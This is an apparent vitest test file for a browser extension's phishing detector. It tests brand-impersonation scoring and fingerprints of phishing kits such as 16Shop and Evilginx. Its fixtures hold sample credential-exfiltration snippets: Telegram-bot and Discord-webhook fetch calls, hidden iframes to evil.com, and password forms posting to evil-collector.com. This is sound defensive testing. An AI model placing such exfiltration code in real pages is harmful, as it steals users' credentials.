import { describe, expect, it } from "vitest";
import {
  analyzeSnapshot,
  BRAND_DB,
  HTML_SNIPPET_MAX,
  KIT_FINGERPRINTS,
  domainMatchesBrand,
  type PageSnapshot,
} from "../extension/src/content/content_analyzer";

// ---------------------------------------------------------------------------
// Helpers to build PageSnapshot objects for testing
// ---------------------------------------------------------------------------

function emptySnapshot(): PageSnapshot {
  return {
    title: "",
    bodyText: "",
    htmlSnippet: "",
    scriptText: "",
    imgSignals: "",
    hasPasswordField: false,
    formActions: [],
    metaTags: [],
    matchedSelectors: [],
  };
}

function loginSnapshot(opts: {
  title?: string;
  bodyText?: string;
  formAction?: string;
  hasPassword?: boolean;
  imgSignals?: string;
  htmlSnippet?: string;
  scriptText?: string;
  metaTags?: Array<{ name: string; content: string }>;
  matchedSelectors?: string[];
}): PageSnapshot {
  const hasPassword = opts.hasPassword !== false;
  return {
    title: (opts.title ?? "Login").toLowerCase(),
    bodyText: (opts.bodyText ?? "").toLowerCase(),
    htmlSnippet: opts.htmlSnippet ?? `<form${opts.formAction ? ` action="${opts.formAction}"` : ""}><input type="password" /></form>`,
    scriptText: opts.scriptText ?? "",
    imgSignals: (opts.imgSignals ?? "").toLowerCase(),
    hasPasswordField: hasPassword,
    formActions: [{ action: opts.formAction ?? "", hasPassword }],
    metaTags: opts.metaTags ?? [],
    matchedSelectors: opts.matchedSelectors ?? [],
  };
}

// ---------------------------------------------------------------------------
// Brand / domain mismatch
// ---------------------------------------------------------------------------

describe("content_analyzer - brand mismatch", () => {
  it("detects Google branding on non-Google domain (title+img = 45)", () => {
    const snap = loginSnapshot({
      title: "Sign in - Google Accounts",
      imgSignals: "google logo.png",
    });
    const result = analyzeSnapshot(snap, "evil-phish.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Google");
    expect(result.score).toBe(45);
    expect(result.reasons.length).toBeGreaterThan(0);
    expect(result.reasons[0]).toContain("title+img");
  });

  it("detects Microsoft branding on non-Microsoft domain (title only = 30)", () => {
    const snap = loginSnapshot({
      title: "Sign in to your Microsoft account",
    });
    const result = analyzeSnapshot(snap, "evil-login.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Microsoft");
    expect(result.score).toBe(30);
  });

  it("does NOT match Microsoft on generic 'sign in to your account' title", () => {
    const snap = loginSnapshot({
      title: "Sign in to your account",
    });
    const result = analyzeSnapshot(snap, "random-corp.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("detects PayPal branding on non-PayPal domain", () => {
    const snap = loginSnapshot({
      title: "Log in to PayPal",
      bodyText: "paypal secure login",
    });
    const result = analyzeSnapshot(snap, "paypa1-secure.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("PayPal");
  });

  it("detects brand from bodyText only with weak score (+10)", () => {
    const snap = loginSnapshot({
      title: "Login Page",
      bodyText: "welcome to netflix sign in to continue watching.",
    });
    const result = analyzeSnapshot(snap, "stream-login.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Netflix");
    expect(result.score).toBe(10);
    expect(result.reasons[0]).toContain("bodyText");
  });

  it("detects brand from image alt text with img-only score (+15)", () => {
    const snap = loginSnapshot({
      title: "Login",
      imgSignals: "amazon logo fake-logo.png",
    });
    const result = analyzeSnapshot(snap, "amaz0n-login.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Amazon");
    expect(result.score).toBe(15);
    expect(result.reasons[0]).toContain("img");
  });

  it("does NOT flag brand mismatch on legitimate Google domain", () => {
    const snap = loginSnapshot({
      title: "Sign in - Google Accounts",
      imgSignals: "google logo.png",
    });
    const result = analyzeSnapshot(snap, "accounts.google.com");
    expect(result.brandMismatch).toBe(false);
    expect(result.brandDetected).toBeUndefined();
  });

  it("does NOT flag brand mismatch on legitimate Microsoft domain", () => {
    const snap = loginSnapshot({
      title: "Sign in to your Microsoft account",
    });
    const result = analyzeSnapshot(snap, "login.microsoftonline.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("does NOT flag brand mismatch when no password field present", () => {
    const snap = loginSnapshot({
      title: "Sign in - Google Accounts",
      hasPassword: false,
    });
    const result = analyzeSnapshot(snap, "evil-phish.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("detects multiple bank brands", () => {
    // Chase requires "Chase Bank" / "Chase Online" / "Chase.com" in title
    // because "chase" is a common English word.
    const bankTitles: Record<string, string> = {
      "Wells Fargo": "wells fargo online banking",
      "Chase": "chase bank online banking",
      "Bank of America": "bank of america online banking",
      "Citibank": "citibank online banking",
    };
    for (const brandName of ["Wells Fargo", "Chase", "Bank of America", "Citibank"]) {
      const brand = BRAND_DB.find((b) => b.name === brandName);
      expect(brand).toBeDefined();
      const snap = loginSnapshot({
        title: bankTitles[brandName]!,
        bodyText: `welcome to ${brandName}`.toLowerCase(),
      });
      const result = analyzeSnapshot(snap, "fake-bank.com");
      expect(result.brandMismatch).toBe(true);
      expect(result.brandDetected).toBe(brandName);
    }
  });

  it("detects shipping brand mismatch (USPS, DHL, FedEx)", () => {
    for (const brandName of ["USPS", "DHL", "FedEx"]) {
      const snap = loginSnapshot({
        title: `${brandName} Tracking`.toLowerCase(),
        bodyText: `${brandName} Package Tracking`.toLowerCase(),
      });
      const result = analyzeSnapshot(snap, "track-parcels.com");
      expect(result.brandMismatch).toBe(true);
      expect(result.brandDetected).toBe(brandName);
    }
  });
});

// ---------------------------------------------------------------------------
// Phishing kit fingerprints
// ---------------------------------------------------------------------------

describe("content_analyzer - phishing kit detection", () => {
  it("detects 16Shop kit signature via selector", () => {
    const snap = loginSnapshot({
      matchedSelectors: [".login-16shop"],
      htmlSnippet: '<div class="login-16shop"><form><input type="password" /></form></div>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("16Shop");
  });

  it("detects 16Shop kit signature via HTML pattern", () => {
    const snap = loginSnapshot({
      htmlSnippet: '<div id="panel16-login"><form><input type="password" /></form></div>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("16Shop");
  });

  it("detects Telegram exfil pattern", () => {
    const snap = loginSnapshot({
      scriptText: 'var telegram_bot = "12345:ABCdef"; fetch("https://api.telegram.org/bot" + telegram_bot);',
      htmlSnippet: '<script>var telegram_bot = "12345:ABCdef"; fetch("https://api.telegram.org/bot" + telegram_bot);</script>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Telegram-Exfil");
  });

  it("detects Discord webhook exfil", () => {
    const snap = loginSnapshot({
      htmlSnippet: '<script>fetch("https://discordapp.com/api/webhooks/123/abc", { method: "POST" });</script>',
      scriptText: 'fetch("https://discordapp.com/api/webhooks/123/abc", { method: "POST" });',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Discord-Webhook-Exfil");
  });

  it("detects hidden iframe phishing pattern via selector", () => {
    const snap = loginSnapshot({
      matchedSelectors: ['iframe[width="0"]'],
      htmlSnippet: '<iframe src="https://evil.com/collect" style="display:none" width="0" height="0"></iframe>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Phish-Hidden-Iframe");
  });

  it("detects a hidden exfil form with whitespace in the style via the bounded regex (D-REDOS)", () => {
    // "display: none" (with space) is missed by the [style*="display:none"]
    // selector, so only the htmlPattern can catch it — confirms the bounded
    // quantifiers did not drop this realistic match.
    const snap = loginSnapshot({
      htmlSnippet: '<form style="display: none"><input type="password" /></form>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Exfil-Hidden-Form");
  });

  it("derives the exfil htmlPattern bounds from HTML_SNIPPET_MAX so they can't drift from the slice (D-REDOS)", () => {
    const cap = `{0,${HTML_SNIPPET_MAX}}`;
    const form = KIT_FINGERPRINTS.find((k) => k.name === "Exfil-Hidden-Form");
    const iframe = KIT_FINGERPRINTS.find((k) => k.name === "Data-Exfil-Iframe");
    expect(form?.htmlPatterns?.[0]?.source).toContain(cap);
    expect(iframe?.htmlPatterns?.[0]?.source).toContain(cap);
  });

  it("detects a data-exfil iframe by an src keyword via the bounded regex (D-REDOS)", () => {
    const snap = loginSnapshot({
      htmlSnippet: '<iframe src="https://evil.example/api/exfil/data"></iframe>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Data-Exfil-Iframe");
  });

  it("still matches a heavily-padded hidden form within the snippet cap (no FN regression, D-REDOS)", () => {
    // ~1.6KB of attributes before `style` + whitespace `display: none` (missed by
    // the [style*="display:none"] selector). The {0,10000} ceiling equals the
    // htmlSnippet cap, so this still matches — it would FAIL if the bound were
    // re-tightened below the realistic range, guarding against a detection-
    // narrowing regression while keeping the quantifiers non-unbounded.
    const pad = 'data-x="1" '.repeat(150); // ~1650 chars, well under the 10KB cap
    const snap = loginSnapshot({
      htmlSnippet: `<form ${pad}style="display: none"><input type="password" /></form>`,
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Exfil-Hidden-Form");
  });

  it("detects Gophish meta tag", () => {
    const snap = loginSnapshot({
      metaTags: [{ name: "generator", content: "gophish" }],
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Gophish");
  });

  it("detects Evilginx signature in script", () => {
    const snap = loginSnapshot({
      scriptText: "var evilginx_config = {};",
      htmlSnippet: "<script>var evilginx_config = {};</script>",
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Evilginx");
  });

  it("detects Modlishka kit in HTML", () => {
    const snap = loginSnapshot({
      htmlSnippet: "<!-- modlishka reverse proxy -->",
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Modlishka");
  });

  it("detects Zphisher kit in script", () => {
    const snap = loginSnapshot({
      scriptText: "// zphisher framework",
      htmlSnippet: "<script>// zphisher framework</script>",
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Zphisher");
  });

  it("does NOT flag a clean page as phishing kit", () => {
    const snap = loginSnapshot({
      title: "My App Login",
      bodyText: "welcome to my app",
      htmlSnippet: "<html><body><h1>Welcome</h1><form><input type=\"password\" /></form></body></html>",
    });
    const result = analyzeSnapshot(snap, "myapp.com");
    expect(result.phishingKitMatch).toBe(false);
    expect(result.kitName).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Suspicious form actions
// ---------------------------------------------------------------------------

describe("content_analyzer - suspicious form actions", () => {
  it("flags form with data: URI action", () => {
    const snap = loginSnapshot({
      formAction: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.suspiciousFormAction).toBe(true);
    expect(result.reasons).toContain("Form action uses a data: URI");
  });

  it("flags form with javascript: URI action", () => {
    const snap = loginSnapshot({
      formAction: "javascript:void(0)",
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.suspiciousFormAction).toBe(true);
    expect(result.reasons).toContain("Form action uses a javascript: URI");
  });

  it("flags form with base64-encoded action", () => {
    const snap = loginSnapshot({
      formAction: "aHR0cHM6Ly9ldmlsLmNvbS9jb2xsZWN0",
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.suspiciousFormAction).toBe(true);
    expect(result.reasons.some((r) => r.includes("base64"))).toBe(true);
  });

  it("flags password form submitting to different domain", () => {
    const snap = loginSnapshot({
      formAction: "https://evil-collector.com/harvest",
    });
    const result = analyzeSnapshot(snap, "legitimate-site.com");
    expect(result.suspiciousFormAction).toBe(true);
    expect(result.reasons.some((r) => r.includes("different domain"))).toBe(true);
  });

  it("does NOT flag same-domain form action", () => {
    const snap = loginSnapshot({
      formAction: "https://myapp.com/login",
    });
    const result = analyzeSnapshot(snap, "myapp.com");
    expect(result.suspiciousFormAction).toBe(false);
  });

  it("does NOT flag relative form action", () => {
    const snap = loginSnapshot({
      formAction: "/api/login",
    });
    const result = analyzeSnapshot(snap, "myapp.com");
    expect(result.suspiciousFormAction).toBe(false);
  });

  it("does NOT flag empty form action", () => {
    const snap = loginSnapshot({ formAction: "" });
    const result = analyzeSnapshot(snap, "myapp.com");
    expect(result.suspiciousFormAction).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Login form on unrecognized domain
// ---------------------------------------------------------------------------

describe("content_analyzer - unrecognized domain login", () => {
  it("adds small score (+5) for login-titled page on unknown domain", () => {
    const snap = loginSnapshot({
      title: "sign in - secure portal",
    });
    const result = analyzeSnapshot(snap, "random-unknown-site.com");
    expect(result.score).toBe(5);
    expect(result.reasons.some((r) => r.includes("unrecognized domain"))).toBe(true);
  });

  it("adds small score (+5) for page with 'Log in' title on unknown domain", () => {
    const snap = loginSnapshot({
      title: "log in - secure access",
    });
    const result = analyzeSnapshot(snap, "phishy-site.net");
    expect(result.score).toBe(5);
  });

  it("does NOT flag login page on known brand domain", () => {
    const snap = loginSnapshot({
      title: "sign in to your account",
    });
    const result = analyzeSnapshot(snap, "google.com");
    expect(result.reasons.some((r) => r.includes("unrecognized domain"))).toBe(false);
  });

  it("does NOT flag page without password field", () => {
    const snap = loginSnapshot({
      title: "sign in",
      hasPassword: false,
    });
    const result = analyzeSnapshot(snap, "random-unknown-site.com");
    expect(result.reasons.some((r) => r.includes("unrecognized domain"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Combined scoring
// ---------------------------------------------------------------------------

describe("content_analyzer - combined scoring", () => {
  it("caps score at 100 even with multiple signals", () => {
    const snap: PageSnapshot = {
      title: "sign in - google accounts",
      bodyText: "google sign in",
      htmlSnippet: '<div class="login-16shop"><form action="data:evil"><input type="password" /></form></div>',
      scriptText: "",
      imgSignals: "",
      hasPasswordField: true,
      formActions: [{ action: "data:text/html;base64,evil", hasPassword: true }],
      metaTags: [],
      matchedSelectors: [".login-16shop"],
    };
    const result = analyzeSnapshot(snap, "evil-phish.com");
    expect(result.score).toBeLessThanOrEqual(100);
    expect(result.brandMismatch).toBe(true);
    expect(result.phishingKitMatch).toBe(true);
    expect(result.suspiciousFormAction).toBe(true);
  });

  it("returns zero score for benign page", () => {
    const snap: PageSnapshot = {
      title: "my blog",
      bodyText: "welcome to my blog. just some text.",
      htmlSnippet: "<html><body><h1>Welcome to my blog</h1></body></html>",
      scriptText: "",
      imgSignals: "",
      hasPasswordField: false,
      formActions: [],
      metaTags: [],
      matchedSelectors: [],
    };
    const result = analyzeSnapshot(snap, "myblog.com");
    expect(result.score).toBe(0);
    expect(result.brandMismatch).toBe(false);
    expect(result.phishingKitMatch).toBe(false);
    expect(result.suspiciousFormAction).toBe(false);
    expect(result.reasons).toHaveLength(0);
  });

  it("returns zero score for a legitimate login page with no brand signals", () => {
    const snap = loginSnapshot({
      title: "myapp - dashboard",
      bodyText: "welcome back",
      formAction: "/api/auth",
    });
    const result = analyzeSnapshot(snap, "myapp.com");
    expect(result.score).toBe(0);
    expect(result.brandMismatch).toBe(false);
    expect(result.phishingKitMatch).toBe(false);
    expect(result.suspiciousFormAction).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Brand database coverage
// ---------------------------------------------------------------------------

describe("content_analyzer - brand database", () => {
  it("has all 20 required brands", () => {
    const requiredBrands = [
      "Google", "Microsoft", "Apple", "Amazon", "PayPal",
      "Netflix", "Facebook", "Instagram", "Twitter", "LinkedIn",
      "Dropbox", "Adobe", "Yahoo", "Wells Fargo", "Chase",
      "Bank of America", "Citibank", "USPS", "DHL", "FedEx",
    ];
    for (const name of requiredBrands) {
      const found = BRAND_DB.find((b) => b.name === name);
      expect(found, `Brand "${name}" should exist in BRAND_DB`).toBeDefined();
      expect(found!.domains.length).toBeGreaterThan(0);
      expect(found!.titlePatterns.length).toBeGreaterThan(0);
    }
  });

  it("each brand has non-empty domains and title patterns", () => {
    for (let i = 0; i < BRAND_DB.length; i++) {
      const brand = BRAND_DB[i]!;
      expect(brand.domains.length, `${brand.name} domains`).toBeGreaterThan(0);
      expect(brand.titlePatterns.length, `${brand.name} titlePatterns`).toBeGreaterThan(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Kit fingerprint database coverage
// ---------------------------------------------------------------------------

describe("content_analyzer - kit fingerprints", () => {
  it("has at least 20 fingerprints", () => {
    expect(KIT_FINGERPRINTS.length).toBeGreaterThanOrEqual(20);
  });

  it("each fingerprint has at least one detection method", () => {
    for (let i = 0; i < KIT_FINGERPRINTS.length; i++) {
      const kit = KIT_FINGERPRINTS[i]!;
      const hasMethods =
        (kit.selectors && kit.selectors.length > 0) ||
        (kit.htmlPatterns && kit.htmlPatterns.length > 0) ||
        (kit.metaPatterns && kit.metaPatterns.length > 0) ||
        (kit.scriptVarPatterns && kit.scriptVarPatterns.length > 0);
      expect(hasMethods, `Kit "${kit.name}" should have at least one detection method`).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// domainMatchesBrand helper
// ---------------------------------------------------------------------------

describe("content_analyzer - domainMatchesBrand", () => {
  const google = BRAND_DB.find((b) => b.name === "Google")!;

  it("matches exact domain", () => {
    expect(domainMatchesBrand("google.com", google)).toBe(true);
  });

  it("matches subdomain of brand domain", () => {
    expect(domainMatchesBrand("accounts.google.com", google)).toBe(true);
  });

  it("matches gmail.com as Google", () => {
    expect(domainMatchesBrand("gmail.com", google)).toBe(true);
  });

  it("does not match unrelated domain", () => {
    expect(domainMatchesBrand("evil-phish.com", google)).toBe(false);
  });

  it("does not match partial domain name", () => {
    expect(domainMatchesBrand("notgoogle.com", google)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Edge cases
// ---------------------------------------------------------------------------

describe("content_analyzer - edge cases", () => {
  it("handles empty snapshot gracefully", () => {
    const snap = emptySnapshot();
    const result = analyzeSnapshot(snap, "example.com");
    expect(result.score).toBe(0);
    expect(result.reasons).toHaveLength(0);
  });

  it("handles empty domain string", () => {
    const snap = loginSnapshot({ title: "login" });
    const result = analyzeSnapshot(snap, "");
    expect(result).toBeDefined();
  });

  it("handles very long page title without hanging", () => {
    const longTitle = "google ".repeat(1000);
    const snap = loginSnapshot({ title: longTitle });
    const start = Date.now();
    const result = analyzeSnapshot(snap, "evil.com");
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(500);
    expect(result).toBeDefined();
  });

  it("password field disabled does not trigger brand mismatch", () => {
    const snap = loginSnapshot({
      title: "google sign in",
      hasPassword: false,
    });
    const result = analyzeSnapshot(snap, "evil.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("score never exceeds 100 even with max signals", () => {
    // title+img brand mismatch (45) + phishing kit (40) + suspicious form (25) = 110 -> capped at 100
    const snap: PageSnapshot = {
      title: "sign in - google accounts",
      bodyText: "google paypal netflix",
      htmlSnippet: '<div class="login-16shop"><form action="data:evil"><input type="password" /></form></div>',
      scriptText: "",
      imgSignals: "google",
      hasPasswordField: true,
      formActions: [{ action: "data:text/html;base64,evil", hasPassword: true }],
      metaTags: [],
      matchedSelectors: [".login-16shop"],
    };
    const result = analyzeSnapshot(snap, "evil-phish.com");
    expect(result.score).toBeLessThanOrEqual(100);
    expect(result.brandMismatch).toBe(true);
    expect(result.phishingKitMatch).toBe(true);
    expect(result.suspiciousFormAction).toBe(true);
  });

  it("does not crash on formAction with invalid URL characters", () => {
    const snap = loginSnapshot({
      formAction: "ht tp://[invalid",
    });
    const result = analyzeSnapshot(snap, "example.com");
    expect(result).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// Tiered brand scoring
// ---------------------------------------------------------------------------

describe("content_analyzer - tiered brand scoring", () => {
  it("title + img match = 45 (strongest tier)", () => {
    const snap = loginSnapshot({
      title: "Sign in - Google Accounts",
      imgSignals: "google logo.png",
    });
    const result = analyzeSnapshot(snap, "evil.com");
    expect(result.score).toBe(45);
    expect(result.reasons[0]).toContain("title+img");
  });

  it("title only = 30", () => {
    const snap = loginSnapshot({
      title: "Sign in - Google Accounts",
    });
    const result = analyzeSnapshot(snap, "evil.com");
    expect(result.score).toBe(30);
    expect(result.reasons[0]).toContain("title");
  });

  it("img only = 15", () => {
    const snap = loginSnapshot({
      title: "Login",
      imgSignals: "paypal logo.png",
    });
    const result = analyzeSnapshot(snap, "evil.com");
    expect(result.score).toBe(15);
    expect(result.reasons[0]).toContain("img");
  });

  it("bodyText only = 10 (weakest tier)", () => {
    const snap = loginSnapshot({
      title: "Login",
      bodyText: "sign in with google to continue",
    });
    const result = analyzeSnapshot(snap, "evil.com");
    expect(result.score).toBe(10);
    expect(result.reasons[0]).toContain("bodyText");
  });

  it("title + bodyText = 30 (title dominates)", () => {
    const snap = loginSnapshot({
      title: "PayPal - Log in",
      bodyText: "paypal secure login",
    });
    const result = analyzeSnapshot(snap, "evil.com");
    expect(result.score).toBe(30);
    expect(result.reasons[0]).toContain("title+bodyText");
  });
});

// ---------------------------------------------------------------------------
// Common-word brand suppression (apple, adobe, chase)
// ---------------------------------------------------------------------------

describe("content_analyzer - common-word brand suppression", () => {
  it("does NOT flag 'apple' from bodyText alone", () => {
    const snap = loginSnapshot({
      title: "Login",
      bodyText: "buy the latest apple products here",
    });
    const result = analyzeSnapshot(snap, "fruit-store.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("does NOT flag 'adobe' from bodyText alone", () => {
    const snap = loginSnapshot({
      title: "Login",
      bodyText: "made with adobe photoshop",
    });
    const result = analyzeSnapshot(snap, "design-blog.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("does NOT flag 'chase' from bodyText alone", () => {
    const snap = loginSnapshot({
      title: "Login",
      bodyText: "chase your dreams today",
    });
    const result = analyzeSnapshot(snap, "motivation-site.com");
    expect(result.brandMismatch).toBe(false);
  });

  it("DOES flag Apple when title matches Apple ID", () => {
    const snap = loginSnapshot({
      title: "Apple ID - Sign In",
      bodyText: "apple id sign in",
    });
    const result = analyzeSnapshot(snap, "evil-apple.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Apple");
  });

  it("DOES flag Adobe when title matches", () => {
    const snap = loginSnapshot({
      title: "Adobe Sign In",
      bodyText: "sign in to your adobe account",
    });
    const result = analyzeSnapshot(snap, "evil-adobe.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Adobe");
  });

  it("DOES flag Chase when title says 'Chase Bank'", () => {
    const snap = loginSnapshot({
      title: "Chase Bank Online",
      bodyText: "welcome to chase",
    });
    const result = analyzeSnapshot(snap, "evil-chase.com");
    expect(result.brandMismatch).toBe(true);
    expect(result.brandDetected).toBe("Chase");
  });

  it("does NOT flag Chase on bare 'chase' in title", () => {
    const snap = loginSnapshot({
      title: "The Great Chase - Login",
      bodyText: "chase the prize",
    });
    const result = analyzeSnapshot(snap, "game-site.com");
    // "chase" alone in title should NOT match the narrowed pattern
    expect(result.brandDetected).not.toBe("Chase");
  });
});

// ---------------------------------------------------------------------------
// Hidden-Input-Harvester narrowed
// ---------------------------------------------------------------------------

describe("content_analyzer - Hidden-Input-Harvester narrowed", () => {
  it("does NOT flag standard CSRF token hidden inputs", () => {
    const snap = loginSnapshot({
      matchedSelectors: ['input[type="hidden"][name*="token"]'],
      htmlSnippet: '<form><input type="hidden" name="csrf_token" value="abc123" /><input type="password" /></form>',
    });
    const result = analyzeSnapshot(snap, "legit-site.com");
    // The narrowed fingerprint no longer has selectors, so this should not trigger
    expect(result.phishingKitMatch).toBe(false);
  });

  it("DOES flag pages containing 'harvester' keyword", () => {
    const snap = loginSnapshot({
      htmlSnippet: '<div class="harvester-panel"><form><input type="password" /></form></div>',
    });
    const result = analyzeSnapshot(snap, "phish.com");
    expect(result.phishingKitMatch).toBe(true);
    expect(result.kitName).toBe("Hidden-Input-Harvester");
  });
});

// ---------------------------------------------------------------------------
// SSO / social login false-positive guards
// ---------------------------------------------------------------------------

describe("content_analyzer - SSO and social login FP guards", () => {
  it("bodyText mention of 'google' with password does NOT give high score", () => {
    // Simulates an SSO page that says "Sign in with Google" but is a
    // legitimate third-party site.
    const snap = loginSnapshot({
      title: "My App - Login",
      bodyText: "sign in with google or facebook to continue",
    });
    const result = analyzeSnapshot(snap, "myapp.com");
    // bodyText only => 10 (Google wins because it appears first in DB)
    expect(result.score).toBeLessThanOrEqual(10);
  });

  it("'Pay with PayPal' button text does NOT trigger high score", () => {
    const snap = loginSnapshot({
      title: "Checkout - My Store",
      bodyText: "pay with paypal or credit card",
    });
    const result = analyzeSnapshot(snap, "mystore.com");
    // bodyText only => 10
    expect(result.score).toBeLessThanOrEqual(10);
  });
});
